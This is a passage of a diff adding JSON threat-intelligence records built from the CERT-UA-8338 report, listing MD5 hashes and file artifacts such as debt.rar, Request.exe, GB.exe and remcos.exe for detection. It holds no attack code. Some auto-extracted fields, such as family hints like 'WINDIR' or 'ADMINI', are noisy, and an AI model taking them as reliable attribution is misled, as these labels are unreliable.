+      "value": "0e38564d3cff4859e4418ff3b1c57506",
+      "ioc_type": "md5",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_15",
+      "supporting_evidence_ids": [],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_hash"
+    },
+    {
+      "id": "ent_ioc_md5_1ac510cf6c0d34f5148e3136494a2366",
+      "type": "MD5",
+      "name": "1ac510cf6c0d34f5148e3136494a2366",
+      "normalized_name": "1ac510cf6c0d34f5148e3136494a2366",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_15"
+      ],
+      "report_id": "CERT-UA-8338(12-21-2023)",
+      "value": "1ac510cf6c0d34f5148e3136494a2366",
+      "ioc_type": "md5",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_15",
+      "supporting_evidence_ids": [],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_hash"
+    },
+    {
+      "id": "ent_ioc_md5_1d1d06ebd13ed9a3ea9254962a4c189f",
+      "type": "MD5",
+      "name": "1d1d06ebd13ed9a3ea9254962a4c189f",
+      "normalized_name": "1d1d06ebd13ed9a3ea9254962a4c189f",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_14",
+        "ev_8"
+      ],
+      "report_id": "CERT-UA-8338(12-21-2023)",
+      "value": "1d1d06ebd13ed9a3ea9254962a4c189f",
+      "ioc_type": "md5",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_14",
+      "supporting_evidence_ids": [
+        "ev_8"
+      ],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_hash"
+    },
+    {
+      "id": "ent_ioc_md5_324afa8304dc6a079e8f9a2f2ea9654f",
+      "type": "MD5",
+      "name": "324afa8304dc6a079e8f9a2f2ea9654f",
+      "normalized_name": "324afa8304dc6a079e8f9a2f2ea9654f",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_14",
+        "ev_8"
+      ],
+      "report_id": "CERT-UA-8338(12-21-2023)",
+      "value": "324afa8304dc6a079e8f9a2f2ea9654f",
+      "ioc_type": "md5",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_14",
+      "supporting_evidence_ids": [
+        "ev_8"
+      ],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_hash"
+    },
+    {
+      "id": "ent_ioc_md5_4754f0ede14f1bae26b69bd43c7b6705",
+      "type": "MD5",
+      "name": "4754f0ede14f1bae26b69bd43c7b6705",
+      "normalized_name": "4754f0ede14f1bae26b69bd43c7b6705",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_14",
+        "ev_8"
+      ],
+      "report_id": "CERT-UA-8338(12-21-2023)",
+      "value": "4754f0ede14f1bae26b69bd43c7b6705",
+      "ioc_type": "md5",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_14",
+      "supporting_evidence_ids": [
+        "ev_8"
+      ],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_hash"
+    },
+    {
+      "id": "ent_ioc_md5_490a5462fc6e4f477811ee08a00c7c85",
+      "type": "MD5",
+      "name": "490a5462fc6e4f477811ee08a00c7c85",
+      "normalized_name": "490a5462fc6e4f477811ee08a00c7c85",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_23"
+      ],
+      "report_id": "CERT-UA-8338(12-21-2023)",
+      "value": "490a5462fc6e4f477811ee08a00c7c85",
+      "ioc_type": "md5",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_23",
+      "supporting_evidence_ids": [],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_hash"
+    },
+    {
+      "id": "ent_ioc_md5_4febae6a56361fa83265fa07f50a1880",
+      "type": "MD5",
+      "name": "4febae6a56361fa83265fa07f50a1880",
+      "normalized_name": "4febae6a56361fa83265fa07f50a1880",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_15"
+      ],
+      "report_id": "CERT-UA-8338(12-21-2023)",
+      "value": "4febae6a56361fa83265fa07f50a1880",
+      "ioc_type": "md5",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_15",
+      "supporting_evidence_ids": [],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_hash"
+    },
+    {
+      "id": "ent_ioc_md5_53b204f96e93b70a528b88bedfd6b794",
+      "type": "MD5",
+      "name": "53b204f96e93b70a528b88bedfd6b794",
+      "normalized_name": "53b204f96e93b70a528b88bedfd6b794",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_16",
+        "ev_9"
+      ],
+      "report_id": "CERT-UA-8338(12-21-2023)",
+      "value": "53b204f96e93b70a528b88bedfd6b794",
+      "ioc_type": "md5",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_16",
+      "supporting_evidence_ids": [
+        "ev_9"
+      ],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_hash"
+    },
+    {
+      "id": "ent_ioc_md5_5639D40461DCDD07011A2B87AD3C9EDD",
+      "type": "MD5",
+      "name": "5639D40461DCDD07011A2B87AD3C9EDD",
+      "normalized_name": "5639D40461DCDD07011A2B87AD3C9EDD",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_12",
+        "ev_13",
+        "ev_5"
+      ],
+      "report_id": "CERT-UA-8338(12-21-2023)",
+      "value": "5639D40461DCDD07011A2B87AD3C9EDD",
+      "ioc_type": "md5",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_12",
+      "supporting_evidence_ids": [
+        "ev_13",
+        "ev_5"
+      ],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_hash"
+    },
+    {
+      "id": "ent_ioc_md5_57ea2a297e1881d1015634c3e9b7c66d",
+      "type": "MD5",
+      "name": "57ea2a297e1881d1015634c3e9b7c66d",
+      "normalized_name": "57ea2a297e1881d1015634c3e9b7c66d",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_15"
+      ],
+      "report_id": "CERT-UA-8338(12-21-2023)",
+      "value": "57ea2a297e1881d1015634c3e9b7c66d",
+      "ioc_type": "md5",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_15",
+      "supporting_evidence_ids": [],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_hash"
+    },
+    {
+      "id": "ent_ioc_md5_6041845b2fe9dfb4b06fed8ec8a05295",
+      "type": "MD5",
+      "name": "6041845b2fe9dfb4b06fed8ec8a05295",
+      "normalized_name": "6041845b2fe9dfb4b06fed8ec8a05295",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_16",
+        "ev_9"
+      ],
+      "report_id": "CERT-UA-8338(12-21-2023)",
+      "value": "6041845b2fe9dfb4b06fed8ec8a05295",
+      "ioc_type": "md5",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_16",
+      "supporting_evidence_ids": [
+        "ev_9"
+      ],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_hash"
+    },
+    {
+      "id": "ent_ioc_md5_628ef6dc40f8b6e89b6d537463add174",
+      "type": "MD5",
+      "name": "628ef6dc40f8b6e89b6d537463add174",
+      "normalized_name": "628ef6dc40f8b6e89b6d537463add174",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_14",
+        "ev_8"
+      ],
+      "report_id": "CERT-UA-8338(12-21-2023)",
+      "value": "628ef6dc40f8b6e89b6d537463add174",
+      "ioc_type": "md5",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_14",
+      "supporting_evidence_ids": [
+        "ev_8"
+      ],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_hash"
+    },
+    {
+      "id": "ent_ioc_md5_62f588d655331f053795087b657743fe",
+      "type": "MD5",
+      "name": "62f588d655331f053795087b657743fe",
+      "normalized_name": "62f588d655331f053795087b657743fe",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_15"
+      ],
+      "report_id": "CERT-UA-8338(12-21-2023)",
+      "value": "62f588d655331f053795087b657743fe",
+      "ioc_type": "md5",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_15",
+      "supporting_evidence_ids": [],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_hash"
+    },
+    {
+      "id": "ent_ioc_md5_6c704bae1033920b576dacbcff6bfef5",
+      "type": "MD5",
+      "name": "6c704bae1033920b576dacbcff6bfef5",
+      "normalized_name": "6c704bae1033920b576dacbcff6bfef5",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_14",
+        "ev_8"
+      ],
+      "report_id": "CERT-UA-8338(12-21-2023)",
+      "value": "6c704bae1033920b576dacbcff6bfef5",
+      "ioc_type": "md5",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_14",
+      "supporting_evidence_ids": [
+        "ev_8"
+      ],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_hash"
+    },
+    {
+      "id": "ent_ioc_md5_75bc7617d832a378a533d896223587bc",
+      "type": "MD5",
+      "name": "75bc7617d832a378a533d896223587bc",
+      "normalized_name": "75bc7617d832a378a533d896223587bc",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_15"
+      ],
+      "report_id": "CERT-UA-8338(12-21-2023)",
+      "value": "75bc7617d832a378a533d896223587bc",
+      "ioc_type": "md5",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_15",
+      "supporting_evidence_ids": [],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_hash"
+    },
+    {
+      "id": "ent_ioc_md5_848164d084384c49937f99d5b894253e",
+      "type": "MD5",
+      "name": "848164d084384c49937f99d5b894253e",
+      "normalized_name": "848164d084384c49937f99d5b894253e",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_16",
+        "ev_9"
+      ],
+      "report_id": "CERT-UA-8338(12-21-2023)",
+      "value": "848164d084384c49937f99d5b894253e",
+      "ioc_type": "md5",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_16",
+      "supporting_evidence_ids": [
+        "ev_9"
+      ],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_hash"
+    },
+    {
+      "id": "ent_ioc_md5_aae9e3b0ccd99846c3c5606a3164b3bf",
+      "type": "MD5",
+      "name": "aae9e3b0ccd99846c3c5606a3164b3bf",
+      "normalized_name": "aae9e3b0ccd99846c3c5606a3164b3bf",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_15"
+      ],
+      "report_id": "CERT-UA-8338(12-21-2023)",
+      "value": "aae9e3b0ccd99846c3c5606a3164b3bf",
+      "ioc_type": "md5",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_15",
+      "supporting_evidence_ids": [],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_hash"
+    },
+    {
+      "id": "ent_ioc_md5_c3e7cfa2e076c3ca421ddc00496c71b5",
+      "type": "MD5",
+      "name": "c3e7cfa2e076c3ca421ddc00496c71b5",
+      "normalized_name": "c3e7cfa2e076c3ca421ddc00496c71b5",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_14",
+        "ev_8"
+      ],
+      "report_id": "CERT-UA-8338(12-21-2023)",
+      "value": "c3e7cfa2e076c3ca421ddc00496c71b5",
+      "ioc_type": "md5",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_14",
+      "supporting_evidence_ids": [
+        "ev_8"
+      ],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_hash"
+    },
+    {
+      "id": "ent_ioc_md5_ce460418bab48b1e78b3bf611aa34f99",
+      "type": "MD5",
+      "name": "ce460418bab48b1e78b3bf611aa34f99",
+      "normalized_name": "ce460418bab48b1e78b3bf611aa34f99",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_16",
+        "ev_9"
+      ],
+      "report_id": "CERT-UA-8338(12-21-2023)",
+      "value": "ce460418bab48b1e78b3bf611aa34f99",
+      "ioc_type": "md5",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_16",
+      "supporting_evidence_ids": [
+        "ev_9"
+      ],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_hash"
+    },
+    {
+      "id": "ent_ioc_md5_d4f5c321818c7876c6fffffe3e1fc30e",
+      "type": "MD5",
+      "name": "d4f5c321818c7876c6fffffe3e1fc30e",
+      "normalized_name": "d4f5c321818c7876c6fffffe3e1fc30e",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_15"
+      ],
+      "report_id": "CERT-UA-8338(12-21-2023)",
+      "value": "d4f5c321818c7876c6fffffe3e1fc30e",
+      "ioc_type": "md5",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_15",
+      "supporting_evidence_ids": [],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_hash"
+    },
+    {
+      "id": "ent_ioc_md5_de2e053acae98adbecc23ab3c0e9cf5d",
+      "type": "MD5",
+      "name": "de2e053acae98adbecc23ab3c0e9cf5d",
+      "normalized_name": "de2e053acae98adbecc23ab3c0e9cf5d",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_14",
+        "ev_8"
+      ],
+      "report_id": "CERT-UA-8338(12-21-2023)",
+      "value": "de2e053acae98adbecc23ab3c0e9cf5d",
+      "ioc_type": "md5",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_14",
+      "supporting_evidence_ids": [
+        "ev_8"
+      ],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_hash"
+    },
+    {
+      "id": "ent_ioc_md5_e0f074f4d3dcd3b2b59c0c162d83ff57",
+      "type": "MD5",
+      "name": "e0f074f4d3dcd3b2b59c0c162d83ff57",
+      "normalized_name": "e0f074f4d3dcd3b2b59c0c162d83ff57",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_15"
+      ],
+      "report_id": "CERT-UA-8338(12-21-2023)",
+      "value": "e0f074f4d3dcd3b2b59c0c162d83ff57",
+      "ioc_type": "md5",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_15",
+      "supporting_evidence_ids": [],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_hash"
+    },
+    {
+      "id": "ent_ioc_md5_f677caecda3825f2553c0e0dcdf3c1b8",
+      "type": "MD5",
+      "name": "f677caecda3825f2553c0e0dcdf3c1b8",
+      "normalized_name": "f677caecda3825f2553c0e0dcdf3c1b8",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_15"
+      ],
+      "report_id": "CERT-UA-8338(12-21-2023)",
+      "value": "f677caecda3825f2553c0e0dcdf3c1b8",
+      "ioc_type": "md5",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_15",
+      "supporting_evidence_ids": [],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_hash"
+    },
+    {
+      "id": "ent_ioc_md5_fb9ce204ff2b2f8014a547a2de568327",
+      "type": "MD5",
+      "name": "fb9ce204ff2b2f8014a547a2de568327",
+      "normalized_name": "fb9ce204ff2b2f8014a547a2de568327",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_14",
+        "ev_8"
+      ],
+      "report_id": "CERT-UA-8338(12-21-2023)",
+      "value": "fb9ce204ff2b2f8014a547a2de568327",
+      "ioc_type": "md5",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_14",
+      "supporting_evidence_ids": [
+        "ev_8"
+      ],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_hash"
+    },
+    {
+      "id": "ent_ioc_md5_fc196e76dee54125e5fc15018d764fcf",
+      "type": "MD5",
+      "name": "fc196e76dee54125e5fc15018d764fcf",
+      "normalized_name": "fc196e76dee54125e5fc15018d764fcf",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_14",
+        "ev_8"
+      ],
+      "report_id": "CERT-UA-8338(12-21-2023)",
+      "value": "fc196e76dee54125e5fc15018d764fcf",
+      "ioc_type": "md5",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_14",
+      "supporting_evidence_ids": [
+        "ev_8"
+      ],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_hash"
+    },
+    {
+      "id": "ent_ioc_md5_fc99e0883a1fa153693547953a83674e",
+      "type": "MD5",
+      "name": "fc99e0883a1fa153693547953a83674e",
+      "normalized_name": "fc99e0883a1fa153693547953a83674e",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_14",
+        "ev_8"
+      ],
+      "report_id": "CERT-UA-8338(12-21-2023)",
+      "value": "fc99e0883a1fa153693547953a83674e",
+      "ioc_type": "md5",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_14",
+      "supporting_evidence_ids": [
+        "ev_8"
+      ],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_hash"
+    },
+    {
+      "id": "ent_file_cmd.exe",
+      "type": "File",
+      "name": "cmd.exe",
+      "normalized_name": "cmd.exe",
+      "aliases": [],
+      "confidence": 0.94,
+      "evidence_ids": [
+        "ev_20"
+      ],
+      "report_id": "CERT-UA-8338(12-21-2023)",
+      "file_name": "cmd.exe",
+      "sources": [
+        "llm",
+        "rule"
+      ],
+      "primary_evidence_id": "ev_20",
+      "supporting_evidence_ids": [],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "file_role": "abused_legitimate_file",
+      "is_likely_legitimate": true,
+      "family_hints": [
+        "WINDIR",
+        "HKCU",
+        "ADMINI",
+        "APPDATA"
+      ],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_file_artifact"
+    },
+    {
+      "id": "ent_file_debt.part1.rar",
+      "type": "File",
+      "name": "debt.part1.rar",
+      "normalized_name": "debt.part1.rar",
+      "aliases": [],
+      "confidence": 0.94,
+      "evidence_ids": [
+        "ev_14",
+        "ev_8"
+      ],
+      "report_id": "CERT-UA-8338(12-21-2023)",
+      "file_name": "debt.part1.rar",
+      "sources": [
+        "llm",
+        "rule"
+      ],
+      "primary_evidence_id": "ev_14",
+      "supporting_evidence_ids": [
+        "ev_8"
+      ],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "file_role": "file_artifact",
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_file_artifact"
+    },
+    {
+      "id": "ent_file_debt.part2.rar",
+      "type": "File",
+      "name": "debt.part2.rar",
+      "normalized_name": "debt.part2.rar",
+      "aliases": [],
+      "confidence": 0.94,
+      "evidence_ids": [
+        "ev_14",
+        "ev_8"
+      ],
+      "report_id": "CERT-UA-8338(12-21-2023)",
+      "file_name": "debt.part2.rar",
+      "sources": [
+        "llm",
+        "rule"
+      ],
+      "primary_evidence_id": "ev_14",
+      "supporting_evidence_ids": [
+        "ev_8"
+      ],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "file_role": "file_artifact",
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_file_artifact"
+    },
+    {
+      "id": "ent_file_debt.rar",
+      "type": "File",
+      "name": "debt.rar",
+      "normalized_name": "debt.rar",
+      "aliases": [],
+      "confidence": 0.94,
+      "evidence_ids": [
+        "ev_11",
+        "ev_2"
+      ],
+      "report_id": "CERT-UA-8338(12-21-2023)",
+      "file_name": "debt.rar",
+      "sources": [
+        "llm",
+        "rule"
+      ],
+      "primary_evidence_id": "ev_11",
+      "supporting_evidence_ids": [
+        "ev_2"
+      ],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "file_role": "file_artifact",
+      "family_hints": [
+        "ZIP-",
+        "RAR-"
+      ],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_file_artifact"
+    },
+    {
+      "id": "ent_file_debt.zip",
+      "type": "File",
+      "name": "debt.zip",
+      "normalized_name": "debt.zip",
+      "aliases": [],
+      "confidence": 0.94,
+      "evidence_ids": [
+        "ev_1"
+      ],
+      "report_id": "CERT-UA-8338(12-21-2023)",
+      "file_name": "debt.zip",
+      "sources": [
+        "llm",
+        "rule"
+      ],
+      "primary_evidence_id": "ev_1",
+      "supporting_evidence_ids": [],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "file_role": "file_artifact",
+      "family_hints": [
+        "CERT-UA",
+        "CERT"
+      ],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_file_artifact"
+    },
+    {
+      "id": "ent_file_Documents.zip",
+      "type": "File",
+      "name": "Documents.zip",
+      "normalized_name": "Documents.zip",
+      "aliases": [],
+      "confidence": 0.94,
+      "evidence_ids": [
+        "ev_13",
+        "ev_15",
+        "ev_6"
+      ],
+      "report_id": "CERT-UA-8338(12-21-2023)",
+      "file_name": "Documents.zip",
+      "sources": [
+        "llm",
+        "rule"
+      ],
+      "primary_evidence_id": "ev_13",
+      "supporting_evidence_ids": [
+        "ev_15",
+        "ev_6"
+      ],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "file_role": "file_artifact",
+      "family_hints": [
+        "RAR-"
+      ],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_file_artifact"
+    },
+    {
+      "id": "ent_file_explorer.exe",
+      "type": "File",
+      "name": "explorer.exe",
+      "normalized_name": "explorer.exe",
+      "aliases": [],
+      "confidence": 0.94,
+      "evidence_ids": [
+        "ev_12",
+        "ev_20",
+        "ev_4"
+      ],
+      "report_id": "CERT-UA-8338(12-21-2023)",
+      "file_name": "explorer.exe",
+      "sources": [
+        "llm",
+        "rule"
+      ],
+      "primary_evidence_id": "ev_12",
+      "supporting_evidence_ids": [
+        "ev_20",
+        "ev_4"
+      ],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "file_role": "file_artifact",
+      "family_hints": [
+        "BATCH",
+        "WINDIR",
+        "HKCU",
+        "ADMINI"
+      ],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_file_artifact"
+    },
+    {
+      "id": "ent_file_GB.exe",
+      "type": "File",
+      "name": "GB.exe",
+      "normalized_name": "GB.exe",
+      "aliases": [],
+      "confidence": 0.94,
+      "evidence_ids": [
+        "ev_12",
+        "ev_14",
+        "ev_17",
+        "ev_8"
+      ],
+      "report_id": "CERT-UA-8338(12-21-2023)",
+      "file_name": "GB.exe",
+      "sources": [
+        "llm",
+        "rule"
+      ],
+      "primary_evidence_id": "ev_12",
+      "supporting_evidence_ids": [
+        "ev_17",
+        "ev_14",
+        "ev_8"
+      ],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "file_role": "offensive_tool_or_utility",
+      "family_hints": [
+        "BATCH"
+      ],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_file_artifact"
+    },
+    {
+      "id": "ent_file_powershell.exe",
+      "type": "File",
+      "name": "powershell.exe",
+      "normalized_name": "powershell.exe",
+      "aliases": [],
+      "confidence": 0.94,
+      "evidence_ids": [
+        "ev_21"
+      ],
+      "report_id": "CERT-UA-8338(12-21-2023)",
+      "file_name": "powershell.exe",
+      "sources": [
+        "llm",
+        "rule"
+      ],
+      "primary_evidence_id": "ev_21",
+      "supporting_evidence_ids": [],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "file_role": "indicator_artifact",
+      "family_hints": [
+        "LOCALAPPDATA",
+        "TEMP",
+        "NULL"
+      ],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_file_artifact"
+    },
+    {
+      "id": "ent_file_reg.exe",
+      "type": "File",
+      "name": "reg.exe",
+      "normalized_name": "reg.exe",
+      "aliases": [],
+      "confidence": 0.94,
+      "evidence_ids": [
+        "ev_20"
+      ],
+      "report_id": "CERT-UA-8338(12-21-2023)",
+      "file_name": "reg.exe",
+      "sources": [
+        "llm",
+        "rule"
+      ],
+      "primary_evidence_id": "ev_20",
+      "supporting_evidence_ids": [],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "file_role": "indicator_artifact",
+      "family_hints": [
+        "WINDIR",
+        "HKCU",
+        "ADMINI",
+        "APPDATA"
+      ],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_file_artifact"
+    },
+    {
+      "id": "ent_file_remcos.exe",
+      "type": "File",
+      "name": "remcos.exe",
+      "normalized_name": "remcos.exe",
+      "aliases": [],
+      "confidence": 0.94,
+      "evidence_ids": [
+        "ev_16",
+        "ev_9"
+      ],
+      "report_id": "CERT-UA-8338(12-21-2023)",
+      "file_name": "remcos.exe",
+      "sources": [
+        "llm",
+        "rule"
+      ],
+      "primary_evidence_id": "ev_16",
+      "supporting_evidence_ids": [
+        "ev_9"
+      ],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "file_role": "file_artifact",
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_file_artifact"
+    },
+    {
+      "id": "ent_file_Request.exe",
+      "type": "File",
+      "name": "Request.exe",
+      "normalized_name": "Request.exe",
+      "aliases": [],
+      "confidence": 0.94,
+      "evidence_ids": [
+        "ev_13",
+        "ev_15",
+        "ev_7"
+      ],
+      "report_id": "CERT-UA-8338(12-21-2023)",
+      "file_name": "Request.exe",
+      "sources": [
+        "llm",
+        "rule"
+      ],
+      "primary_evidence_id": "ev_13",
+      "supporting_evidence_ids": [
+        "ev_15",
+        "ev_7"
+      ],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "file_role": "offensive_tool_or_utility",
+      "family_hints": [
+        "RAR-"
+      ],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_file_artifact"
+    },
+    {
+      "id": "ent_file_Request.part1.rar",
+      "type": "File",
+      "name": "Request.part1.rar",
+      "normalized_name": "Request.part1.rar",
+      "aliases": [],
+      "confidence": 0.94,
+      "evidence_ids": [
+        "ev_15"
+      ],
+      "report_id": "CERT-UA-8338(12-21-2023)",
+      "file_name": "Request.part1.rar",
+      "sources": [
+        "llm",
+        "rule"
+      ],
+      "primary_evidence_id": "ev_15",
+      "supporting_evidence_ids": [],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "file_role": "file_artifact",
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_file_artifact"
+    },
+    {
+      "id": "ent_file_Request.rar",
+      "type": "File",
+      "name": "Request.rar",
+      "normalized_name": "Request.rar",
+      "aliases": [],
+      "confidence": 0.94,
+      "evidence_ids": [
+        "ev_13",
+        "ev_6"
+      ],
+      "report_id": "CERT-UA-8338(12-21-2023)",
+      "file_name": "Request.rar",
+      "sources": [
+        "llm",
+        "rule"
+      ],
+      "primary_evidence_id": "ev_13",
+      "supporting_evidence_ids": [
+        "ev_6"
+      ],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "file_role": "file_artifact",
+      "family_hints": [
+        "RAR-"
+      ],
+      "entity_scope": "supporting",
